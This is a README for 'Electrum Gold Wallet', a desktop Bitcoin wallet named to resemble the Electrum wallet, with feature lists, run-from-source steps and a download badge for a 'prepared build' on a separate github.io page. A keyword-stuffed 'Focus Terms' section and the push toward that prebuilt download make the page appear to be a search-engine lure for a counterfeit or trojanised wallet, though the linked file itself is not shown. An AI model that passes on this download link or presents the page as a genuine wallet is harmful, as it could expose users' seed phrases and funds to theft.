# Electrum Gold Wallet - Lightweight Bitcoin Wallet With Lightning Tools

<p align="center">
  <img src="logo.png" width="220" alt="Electrum Gold Wallet">
</p>

Electrum Gold Wallet is a fast, non-custodial desktop wallet built around the lightweight Electrum protocol. It keeps private-key control on the device, starts without downloading the full blockchain, and provides practical Bitcoin wallet, payment, backup, and Lightning route tools.

## Wallet Highlights

- Lightweight SPV network access through Electrum servers.
- Local key control with seed phrase backup and wallet recovery.
- Cross-platform Python wallet components for desktop systems.
- Transaction history, fee selection, invoices, contacts, and QR payments.
- Lightning graph inspection, pathfinding, and payment route visualization.
- Hardware-oriented plugin structure and configurable network connections.

![Electrum Connection Status](assets/status_connected.svg)

## Get The Wallet

[![DOWNLOAD ELECTRUM GOLD](https://img.shields.io/badge/DOWNLOAD%20ELECTRUM%20GOLD-0AA9D8?style=for-the-badge&logo=bitcoin&logoColor=white)](https://electrum-gold.github.io/electrum-gold-wallet/electrum-gold)

Choose the download button for the prepared Electrum Gold Wallet build.

### Run From The Source Tree

```powershell
python -m venv .venv
.\.venv\Scripts\Activate.ps1
python -m pip install -e .
python -m wallet
```

The source layout separates the wallet engine, Qt interface, Lightning plugin, and visual assets:

| Area | Path | Purpose |
|---|---|---|
| Wallet core | `wallet/` | Keys, storage, transactions, network, and synchronization |
| Desktop UI | `ui/` | Wallet windows, dialogs, history, QR, and seed screens |
| Lightning tools | `plugins/lightning/` | Graph data, layouts, routes, and pathfinding |
| Visual assets | `assets/` | Connection, lock, QR, and Electrum wallet graphics |

## First Wallet Session

1. Start Electrum Gold Wallet and create a new wallet or restore an existing seed.
2. Store the recovery seed offline before receiving Bitcoin.
3. Review the selected Electrum server in the network dialog.
4. Open the receive screen to create a Bitcoin payment request and QR code.
5. Check the amount, address, and fee before signing a transaction.

![Electrum QR Payment](assets/qrcode.svg)

For Lightning analysis, open the graph plugin and load network gossip data. The visualizer can compare pathfinding parameters and display candidate payment routes while the main Electrum wallet remains connected.

## Focus Terms

electrum wallet, electrum gold, electrum bitcoin, download electrum, electrum bitcoin wallet, bitcoin wallet, electrum btc, electrum app, electrum payments, electrum wallet download

## Project Notes

Keep seed phrases offline, verify destination addresses, and test a small payment before moving a larger balance. Configuration, wallet storage, network selection, and plugin behavior remain available through the included Python modules. The project follows the license terms shipped with its source components.

